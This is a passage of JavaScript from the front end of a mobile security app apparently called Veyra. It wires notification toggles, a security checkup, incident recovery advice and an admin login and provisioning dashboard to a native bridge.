    let tLink = document.getElementById("toggle-notif-link");
    let tMsg = document.getElementById("toggle-notif-msg");
    let tPerm = document.getElementById("toggle-notif-perm");
    let tSound = document.getElementById("toggle-notif-sound");

    if (tSec) tSec.checked = s.security_notifications;
    if (tHigh) tHigh.checked = s.high_risk_alerts;
    if (tLink) tLink.checked = s.suspicious_link_alerts;
    if (tMsg) tMsg.checked = s.suspicious_message_alerts;
    if (tPerm) tPerm.checked = s.permission_warnings;
    if (tSound) tSound.checked = s.sound_alerts;
  } catch (e) {
    console.error("refreshNotificationSettingsUI error", e);
  }
}

function saveNotificationPreferences() {
  let s = {
    security_notifications: document.getElementById("toggle-notif-security").checked,
    high_risk_alerts: document.getElementById("toggle-notif-high-risk").checked,
    suspicious_link_alerts: document.getElementById("toggle-notif-link").checked,
    suspicious_message_alerts: document.getElementById("toggle-notif-msg").checked,
    permission_warnings: document.getElementById("toggle-notif-perm").checked,
    sound_alerts: document.getElementById("toggle-notif-sound").checked
  };
  window.VeyraNative.saveNotificationSettings(JSON.stringify(s));
}

// ==========================================================================
// 14. SAFETY CHECKUP AUDIT
// ==========================================================================
function runCheckupAudit() {
  try {
    let res = JSON.parse(window.VeyraNative.runSecurityCheckup());
    let scoreEl = document.getElementById("checkup-score-val");
    let sumEl = document.getElementById("checkup-summary-text");
    let listEl = document.getElementById("checkup-items-list");

    if (scoreEl) scoreEl.textContent = res.overallScore + "%";
    if (sumEl) sumEl.textContent = `${res.passedCount} of ${res.totalChecks} security hygiene checks passed`;

    if (listEl) {
      listEl.innerHTML = "";
      res.checks.forEach(check => {
        let div = document.createElement("div");
        div.className = "card";
        div.style.marginBottom = "8px";
        div.innerHTML = `
          <div style="display:flex; justify-content:space-between; align-items:center;">
            <div>
              <strong style="font-size:13px; color:var(--text-primary); display:block;">${check.title}</strong>
              <p style="font-size:11.5px; color:var(--text-secondary); margin-top:2px;">${check.recommendation}</p>
            </div>
            <span class="status-badge ${check.passed ? 'active' : 'danger'}" style="margin-bottom:0;">
              ${check.passed ? 'PASSED' : 'ACTION REQUIRED'}
            </span>
          </div>
        `;
        listEl.appendChild(div);
      });
    }
  } catch (e) {
    console.error("runCheckupAudit error", e);
  }
}

// ==========================================================================
// 15. INCIDENT RECOVERY PLAYBOOKS
// ==========================================================================
function loadIncidentAdvice(type) {
  try {
    let advice = JSON.parse(window.VeyraNative.getIncidentAdvice(type));
    let card = document.getElementById("incident-output-card");
    let titleEl = document.getElementById("inc-output-title");
    let urgencyEl = document.getElementById("inc-output-urgency");
    let stepsEl = document.getElementById("inc-output-steps");
    let helpEl = document.getElementById("inc-output-helpline");

    card.style.display = "block";
    titleEl.textContent = advice.title;
    urgencyEl.textContent = advice.urgency;
    stepsEl.innerHTML = "";
    advice.steps.forEach(s => {
      let li = document.createElement("li");
      li.textContent = s;
      stepsEl.appendChild(li);
    });
    helpEl.textContent = advice.helpline;
    card.scrollIntoView({ behavior: "smooth" });
  } catch (e) {
    console.error("loadIncidentAdvice error", e);
  }
}

// ==========================================================================
// 16. ADMIN PORTAL OPERATIONS & AUTHENTICATION
// ==========================================================================
function checkAdminSession() {
  try {
    let userStr = window.VeyraNative.getCurrentUser();
    let user = JSON.parse(userStr);
    let loginCard = document.getElementById("admin-login-card");
    let dashArea = document.getElementById("admin-dashboard-area");

    if (user && user.role === "admin") {
      loginCard.style.display = "none";
      dashArea.style.display = "block";
      loadAdminDashboardData();
    } else {
      loginCard.style.display = "block";
      dashArea.style.display = "none";
    }
  } catch (e) {
    console.error("checkAdminSession error", e);
  }
}

function performAdminLogin() {
  let u = document.getElementById("admin-user-input").value.trim();
  let p = document.getElementById("admin-pass-input").value;

  if (!u || !p) {
    alert("Please enter username and password.");
    return;
  }

  let res = JSON.parse(window.VeyraNative.login(u, p));
  if (res.success) {
    checkAdminSession();
    refreshDashboard();
  } else {
    // POP-UP D: UNAUTHORISED ACCESS ALERT
    document.getElementById("popup-access-resource").textContent = "AUTH_PORTAL (User: " + u + ")";
    document.getElementById("popup-access-time").textContent = new Date().toLocaleTimeString();
    openPopup("popup-unauthorized-access");
    refreshDashboard();
  }
}

function performAdminLogout() {
  window.VeyraNative.logout();
  checkAdminSession();
  refreshDashboard();
}

function performAdminProvision() {
  let u = document.getElementById("prov-user").value.trim();
  let p = document.getElementById("prov-pass").value;
  let token = document.getElementById("prov-token").value.trim();

  let res = JSON.parse(window.VeyraNative.register(u, p, token));
  if (res.success) {
    alert("Admin account provisioned successfully! You can now log in.");
  } else {
    // Rejection logged under blocked attempts
    document.getElementById("popup-access-resource").textContent = "ADMIN_PROVISION";
    document.getElementById("popup-access-time").textContent = new Date().toLocaleTimeString();
    openPopup("popup-unauthorized-access");
    refreshDashboard();
  }
}

function loadAdminDashboardData() {
  try {
    // Load Connected Devices
    let devices = JSON.parse(window.VeyraNative.getRegisteredDevices());
    let tbody = document.getElementById("admin-devices-tbody");
    if (tbody) {
      tbody.innerHTML = "";
      devices.forEach(d => {
        let tr = document.createElement("tr");
        tr.style.borderBottom = "1px solid var(--border-color)";
        tr.innerHTML = `
          <td style="padding:6px 8px; font-family:monospace; color:var(--teal-accent);">${d.installationId}</td>
          <td style="padding:6px 8px;">${d.deviceName}</td>
          <td style="padding:6px 8px;">${d.platform}</td>
          <td style="padding:6px 8px;">${d.appVersion}</td>
          <td style="padding:6px 8px;"><span class="status-badge active" style="font-size:9.5px; padding:2px 6px;">${d.status}</span></td>
        `;
        tbody.appendChild(tr);
      });
    }

    // Load Access Denial Logs
    let logs = JSON.parse(window.VeyraNative.getAccessLogs());
    let listEl = document.getElementById("admin-access-logs-list");
    if (listEl) {
      listEl.innerHTML = "";
      if (logs.length === 0) {
        listEl.innerHTML = "<p style='color:var(--text-muted);'>No access denial events recorded.</p>";
      } else {
        logs.slice(0, 10).forEach(log => {
          let d = new Date(log.timestamp);
          let p = document.createElement("p");
          p.style.marginBottom = "4px";
          p.style.color = log.outcome === "ACCESS DENIED" ? "var(--danger-red)" : "var(--safe-green)";
          p.textContent = `[${d.toLocaleTimeString()}] ${log.action} on ${log.resource} -> ${log.outcome} (${log.details})`;
          listEl.appendChild(p);
        });
      }
    }
  } catch (e) {
    console.error("loadAdminDashboardData error", e);
  }
}
